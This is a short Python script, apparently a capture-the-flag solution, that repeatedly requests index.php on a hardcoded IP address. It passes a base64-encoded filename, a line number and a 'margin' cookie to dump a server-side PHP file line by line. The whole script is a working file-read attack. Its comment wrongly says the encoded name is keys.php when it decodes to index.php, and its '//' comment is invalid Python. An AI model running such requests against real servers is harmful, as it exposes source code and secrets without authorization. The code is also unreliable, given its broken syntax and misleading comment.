import requests
def fun(num):
    session = requests.Session()
    headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Cache-Control":"max-age=0","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0","Connection":"keep-alive","Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2","Accept-Encoding":"gzip, deflate"}
    cookies = {"PHPSESSID":"ldo37io8vtliadt76v2bv8mf43","margin":"margin"}
    paramsGet = {"line":num,"filename":"aW5kZXgucGhw"} //keys.php的base64密文
    response = session.get("http://114.67.246.176:12072/index.php", params=paramsGet, headers=headers, cookies=cookies)
    print(response.text)
for i in range(0,30):
    fun(i)
